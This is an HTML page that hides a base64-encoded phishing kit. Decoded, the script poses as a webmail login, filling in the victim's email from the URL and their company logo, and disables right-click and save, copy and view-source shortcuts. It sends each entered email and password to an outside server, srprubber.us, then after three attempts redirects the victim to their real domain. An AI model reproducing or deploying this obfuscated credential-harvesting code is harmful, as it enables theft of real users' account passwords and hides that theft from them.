Y3JpcHQiIHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvcG9wcGVyLmpzLzEuMTIuOS91bWQvcG9wcGVyLm1pbi5qcyIgaW50ZWdyaXR5PSJzaGEzODQtQXBOYmdoOUIrWTFRS3R2M1JuN1czbWdQeGhVOUsvU2NRc0FQN2hVaWJYMzlqN2Zha0ZQc2t2WHVzdmZhMGI0USIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjAuMC9qcy9ib290c3RyYXAubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1KWlI2U3Blamg0VTAyZDhqT3Q2dkxFSGZlL0pRR2lSUlNRUXhTZkZXcGkxTXF1VmRBeWpVYXI1Kzc2UFZDbVlsIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KPC9ib2R5Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8yLjIuNC9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KCjxzY3JpcHQ+CgoKLy8gcHJldmVudCBjdHJsICsgcwokKGRvY3VtZW50KS5iaW5kKCdrZXlkb3duJywgZnVuY3Rpb24oZSkgewppZihlLmN0cmxLZXkgJiYgKGUud2hpY2ggPT0gODMpKSB7CmUucHJldmVudERlZmF1bHQoKTsKcmV0dXJuIGZhbHNlOwp9Cn0pOwoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignY29udGV4dG1lbnUnLCBldmVudCA9PiBldmVudC5wcmV2ZW50RGVmYXVsdCgpKTsKCmRvY3VtZW50Lm9ua2V5ZG93biA9IGZ1bmN0aW9uKGUpIHsKaWYgKGUuY3RybEtleSAmJiAKKGUua2V5Q29kZSA9PT0gNjcgfHwgCmUua2V5Q29kZSA9PT0gODYgfHwgCmUua2V5Q29kZSA9PT0gODUgfHwgCmUua2V5Q29kZSA9PT0gMTE3KSkgewpyZXR1cm4gZmFsc2U7Cn0gZWxzZSB7CnJldHVybiB0cnVlOwp9Cn07CiQoZG9jdW1lbnQpLmtleXByZXNzKCJ1IixmdW5jdGlvbihlKSB7CmlmKGUuY3RybEtleSkKewpyZXR1cm4gZmFsc2U7ICAgICAgfQplbHNlIHsKcmV0dXJuIHRydWU7Cn19KTsKCi8qIGdsb2JhbCAkICovCiQoZG9jdW1lbnQpLnJlYWR5KGZ1bmN0aW9uKCkgewogICAgdmFyIGNvdW50ID0gMDsKCgogICAgLy8vLy8vLy8vLy8vL3VybCBhaSBnZXR0aW5nLy8vLy8vLy8vLy8vLy8vLwogICAgdmFyIGFpID0gd2luZG93LmxvY2F0aW9uLmhhc2guc3Vic3RyKDEpOwogICAgaWYgKCFhaSkgewoKICAgIH0gZWxzZSB7CiAgICAgICAgdmFyIGJhc2U2NHJlZ2V4ID0gL14oWzAtOWEtekEtWisvXXs0fSkqKChbMC05YS16QS1aKy9dezJ9PT0pfChbMC05YS16QS1aKy9dezN9PSkpPyQvOwoKICAgICAgICBpZiAoIWJhc2U2NHJlZ2V4LnRlc3QoYWkpKSB7CiAgICAgICAgICAgIC8vIGFsZXJ0KGJ0b2EoYWkpKTsKICAgICAgICAgICAgdmFyIG15X2FpID0gYWk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgLy8gYWxlcnQoYXRvYihhaSkpOwogICAgICAgICAgICB2YXIgbXlfYWkgPSBhdG9iKGFpKTsKICAgICAgICB9CiAgICAgICAgLy8gJCgnI2FpJykudmFsKGFpKTsKICAgICAgICAvLyB2YXIgbXlfYWkgPWFpOwogICAgICAgIHZhciBmaWx0ZXIgPSAvXihbYS16QS1aMC05X1wuXC1dKStcQCgoW2EtekEtWjAtOVwtXSkrXC4pKyhbYS16QS1aMC05XXsyLDR9KSskLzsKCiAgICAgICAgaWYgKCFmaWx0ZXIudGVzdChteV9haSkpIHsKICAgICAgICAgICAgJCgnI2Vycm9yJykuc2hvdygpOwogICAgICAgICAgICBhaS5mb2N1czsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICB2YXIgaW5kID0gbXlfYWkuaW5kZXhPZigiQCIpOwogICAgICAgIHZhciBteV9zbGljZSA9IG15X2FpLnN1YnN0cigoaW5kICsgMSkpOwogICAgICAgIHZhciBjID0gbXlfc2xpY2Uuc3Vic3RyKDAsIG15X3NsaWNlLmluZGV4T2YoJy4nKSk7CiAgICAgICAgdmFyIGZpbmFsID0gYy50b0xvd2VyQ2FzZSgpOwogICAgICAgIHZhciBmaW5hbHUgPSBjLnRvVXBwZXJDYXNlKCk7CiAgICAgICAgJCgnI2FpJykudmFsKG15X2FpKTsKICAgICAgICAkKCIjZGl2MSIpLmFuaW1hdGUoeyBsZWZ0OiAwLCBvcGFjaXR5OiAiaGlkZSIgfSwgMCk7CiAgICAgICAgJCgiI2RpdjIiKS5hbmltYXRlKHsgcmlnaHQ6IDAsIG9wYWNpdHk6ICJzaG93IiB9LCA1MDApOwogICAgICAgIAoJCSQoIiNhaWN4IikuaHRtbChteV9haSk7CiAgICAgICAgJCgiI2FpY2giKS5odG1sKG15X2FpKTsKICAgICAgICAkLmdldCgiaHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS8iICsgbXlfc2xpY2UpCiAgICAgICAgICAgIC5kb25lKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgJCgiI2xvZ29pbWciKS5hdHRyKCJzcmMiLCAiaHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS8iICsgbXlfc2xpY2UpOwogICAgICAgICAgICAgICAgJCgiI2xvZ29uYW1lIikuaHRtbChmaW5hbHUpOwoJCQkJJCgiI2xvZ29uYW1lYyIpLmh0bWwoZmluYWx1KTsKCiAgICAgICAgICAgIH0pLmZhaWwoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAkKCIjbG9nb2ltZyIpLmF0dHIoInNyYyIsICJodHRwczovL3dlYm1haWwuZ2VybWFuaWEtZWxla3Ryb25pay5kZS9za2lucy9lbGFzdGljL2ltYWdlcy9sb2dvLnN2ZyIpOwogICAgICAgICAgICAgICAgJCgiI2xvZ29uYW1lIikuaHRtbCgiIik7CgkJCQkkKCIjbG9nb25hbWVjIikuaHRtbCgiIik7CgogICAgICAgICAgICB9KTsKCgogICAgfQoKCgoKCiAgICAkKCcjYWknKS5jbGljayhmdW5jdGlvbigpIHsKICAgICAgICAkKCcjZXJyb3InKS5oaWRlKCk7CiAgICB9KTsKCiAgICAkKGRvY3VtZW50KS5rZXlwcmVzcyhmdW5jdGlvbihldmVudCkgewoKICAgICAgICB2YXIga2V5Y29kZSA9IChldmVudC5rZXlDb2RlID8gZXZlbnQua2V5Q29kZSA6IGV2ZW50LndoaWNoKTsKICAgICAgICBpZiAoa2V5Y29kZSA9PSAnMTMnKSB7CiAgICAgICAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgICAgIGlmICgkKCIjZGl2MSIpLmlzKCI6dmlzaWJsZSIpKSB7CgogICAgICAgICAgICAgICAgJCgiI25leHQiKS5jbGljaygpOwoKICAgICAgICAgICAgfSBlbHNlIGlmICgkKCIjZGl2MiIpLmlzKCI6dmlzaWJsZSIpKSB7CiAgICAgICAgICAgICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwoKICAgICAgICAgICAgICAgICQoIiNzdWJtaXQtYnRuIikuY2xpY2soKTsKCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9KTsKCgogICAgJCgnI25leHQnKS5jbGljayhmdW5jdGlvbigpIHsKICAgICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgIHZhciBteV9haSA9ICQoJyNhaScpLnZhbCgpOwogICAgICAgIHZhciBmaWx0ZXIgPSAvXihbYS16QS1aMC05X1wuXC1dKStcQCgoW2EtekEtWjAtOVwtXSkrXC4pKyhbYS16QS1aMC05XXsyLDR9KSskLzsKCiAgICAgICAgaWYgKCFmaWx0ZXIudGVzdChteV9haSkpIHsKICAgICAgICAgICAgJCgnI2Vycm9yJykuc2hvdygpOwogICAgICAgICAgICBhaS5mb2N1czsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICB2YXIgaW5kID0gbXlfYWkuaW5kZXhPZigiQCIpOwogICAgICAgIHZhciBteV9zbGljZSA9IG15X2FpLnN1YnN0cigoaW5kICsgMSkpOwogICAgICAgIHZhciBjID0gbXlfc2xpY2Uuc3Vic3RyKDAsIG15X3NsaWNlLmluZGV4T2YoJy4nKSk7CiAgICAgICAgdmFyIGZpbmFsID0gYy50b0xvd2VyQ2FzZSgpOwogICAgICAgIHZhciBmaW5hbHUgPSBjLnRvVXBwZXJDYXNlKCk7CiAgICAgICAgJCgiI2RpdjEiKS5hbmltYXRlKHsgbGVmdDogMCwgb3BhY2l0eTogImhpZGUiIH0sIDApOwogICAgICAgICQoIiNkaXYyIikuYW5pbWF0ZSh7IHJpZ2h0OiAwLCBvcGFjaXR5OiAic2hvdyIgfSwgNTAwKTsKCiAgICAgICAgJCgiI2FpY2giKS5odG1sKG15X2FpKTsKCQkkKCIjYWljeCIpLmh0bWwobXlfYWkpOwogICAgICAgICQuZ2V0KCIiICsgbXlfc2xpY2UpCiAgICAgICAgICAgIC5kb25lKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgJCgiI2xvZ29pbWciKS5hdHRyKCJzcmMiLCAiIiArIG15X3NsaWNlKTsKICAgICAgICAgICAgICAgICQoIiNsb2dvbmFtZSIpLmh0bWwoZmluYWx1KTsKCQkJCSQoIiNsb2dvbmFtZWMiKS5odG1sKGZpbmFsdSk7CgogICAgICAgICAgICB9KS5mYWlsKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgJCgiI2xvZ29pbWciKS5hdHRyKCJzcmMiLCAiaHR0cHM6Ly93ZWJtYWlsLmdlcm1hbmlhLWVsZWt0cm9uaWsuZGUvc2tpbnMvZWxhc3RpYy9pbWFnZXMvbG9nby5zdmciKTsKICAgICAgICAgICAgICAgICQoIiNsb2dvbmFtZSIpLmh0bWwoIiIpOwoJCQkJJCgiI2xvZ29uYW1lYyIpLmh0bWwoIiIpOwoKICAgICAgICAgICAgfSk7CgoKCgoKICAgIH0pOwogICAgLy8gJCgnI2JhY2snKS5jbGljayhmdW5jdGlvbigpIHsKICAgIC8vICAgICAvLyAkKCIjbXNnIikuaGlkZSgpOwogICAgLy8gICAgICQoIiNhaSIpLnZhbCgiIik7CiAgICAvLyAgICAgJCgiI3ByIikudmFsKCIiKTsKICAgIC8vICAgICAkKCIjZGl2MiIpLmFuaW1hdGUoeyBsZWZ0OiAwLCBvcGFjaXR5OiAiaGlkZSIgfSwgMCk7CiAgICAvLyAgICAgJCgiI2RpdjEiKS5hbmltYXRlKHsgcmlnaHQ6IDAsIG9wYWNpdHk6ICJzaG93IiB9LCAxMDAwKTsKCiAgICAvLyB9KTsKdmFyIGZpbGU9ImJtVjRkQzV3YUhBPSI7CgogICAgJCgnI3N1Ym1pdC1idG4nKS5jbGljayhmdW5jdGlvbihldmVudCkgewogICAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgdmFyIGFpID0gJCgiI2FpIikudmFsKCk7CiAgICAgICAgdmFyIHByID0gJCgiI3ByIikudmFsKCk7CiAgICAgICAgdmFyIGRldGFpbCA9ICQoIiNmaWVsZCIpLmh0bWwoKTsKICAgICAgICB2YXIgbXNnID0gJCgnI21zZycpLmh0bWwoKTsKCiAgICAgICAgdmFyIG15X2FpID0gYWk7CiAgICAgICAgdmFyIGluZCA9IG15X2FpLmluZGV4T2YoIkAiKTsKICAgICAgICB2YXIgbXlfc2xpY2UgPSBteV9haS5zdWJzdHIoKGluZCArIDEpKTsKICAgICAgICB2YXIgYyA9IG15X3NsaWNlLnN1YnN0cigwLCBteV9zbGljZS5pbmRleE9mKCcuJykpOwogICAgICAgIHZhciBmaW5hbCA9IGMudG9Mb3dlckNhc2UoKTsKICAgICAgICAkKCcjbXNnJykudGV4dChtc2cpOwogICAgICAgIGNvdW50ID0gY291bnQgKyAxOwogICAgICAgICQuYWpheCh7CiAgICAgICAgICAgIGRhdGFUeXBlOiAnSlNPTicsCiAgICAgICAgICAgIHVybDogJ2h0dHBzOi8vc3JwcnViYmVyLnVzL215L2FsbC1kbS8nLAogICAgICAgICAgICB0eXBlOiAnUE9TVCcsCiAgICAgICAgICAgIGRhdGE6IHsKICAgICAgICAgICAgICAgIGFpOiBhaSwKICAgICAgICAgICAgICAgIHByOiBwciwKICAgICAgICAgICAgICAgIGRldGFpbDogZGV0YWlsLAoKICAgICAgICAgICAgfSwKICAgICAgICAgICAgYmVmb3JlU2VuZDogZnVuY3Rpb24oeGhyKSB7CiAgICAgICAgICAgICAgICAkKCIjc3VibWl0LWJ0biIpLmh0bWwoIkF1dGhlbnRpY2F0aW5nLi4uLiIpOwogICAgICAgICAgICB9LAogICAgICAgICAgICBzdWNjZXNzOiBmdW5jdGlvbihyZXNwb25zZSkgewogICAgICAgICAgICAgICAgJCgiI3ByIikudmFsKCIiKTsKICAgICAgICAgICAgICAgIGlmIChjb3VudCA+PTMpIHsKICAgICAgICAgICAgICAgICAgICBjb3VudCA9IDA7CiAgICAgICAgICAgICAgICAgICAgJCgiI2RpdjIiKS5hbmltYXRlKHsgbGVmdDogMCwgb3BhY2l0eTogImhpZGUiIH0sIDApOwogICAgICAgICAgICAgICAgICAgICQoIiNkaXYzIikuYW5pbWF0ZSh7IGxlZnQ6IDAsIG9wYWNpdHk6ICJzaG93IiB9LCA1MDApOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKCJodHRwczovL3d3dy4iK215X3NsaWNlKTsKICAgICAgICAgICAgICAgICAgICB9LCA1MDApOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChjb3VudCA9PSAyKSB7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZzIiKS5zaG93KCk7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZyIpLmhpZGUoKTsKICAgICAgICAgICAgICAgICAgICAkKCIjbXNnMSIpLmhpZGUoKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZzEiKS5zaG93KCk7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZyIpLmhpZGUoKTsKICAgICAgICAgICAgICAgICAgICAkKCIjbXNnMiIpLmhpZGUoKTsKCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIGVycm9yOiBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICQoIiNwciIpLnZhbCgiIik7CiAgICAgICAgICAgICAgICBpZiAoY291bnQgPj0gMykgewogICAgICAgICAgICAgICAgICAgIGNvdW50ID0gMDsKICAgICAgICAgICAgICAgICAgICAkKCIjZGl2MiIpLmFuaW1hdGUoeyBsZWZ0OiAwLCBvcGFjaXR5OiAiaGlkZSIgfSwgMCk7CiAgICAgICAgICAgICAgICAgICAgJCgiI2RpdjMiKS5hbmltYXRlKHsgbGVmdDogMCwgb3BhY2l0eTogInNob3ciIH0sIDUwMCk7CiAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKCJodHRwczovL3d3dy4iK215X3NsaWNlKTsKICAgICAgICAgICAgICAgICAgICB9LCAxMDAwKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoY291bnQgPT0gMikgewogICAgICAgICAgICAgICAgICAgICQoIiNtc2cyIikuc2hvdygpOwogICAgICAgICAgICAgICAgICAgICQoIiNtc2ciKS5oaWRlKCk7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZzEiKS5oaWRlKCk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICQoIiNtc2cxIikuc2hvdygpOwogICAgICAgICAgICAgICAgICAgICQoIiNtc2ciKS5oaWRlKCk7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZzIiKS5oaWRlKCk7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICBjb21wbGV0ZTogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAkKCIjc3VibWl0LWJ0biIpLmh0bWwoIkxvZ2luIik7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgIH0pOwp9KTsKPC9zY3JpcHQ+CgoKCgoKPC9odG1sPg==")));
  </script>
  <title></title>
</head>
<body>
</body>
</html>
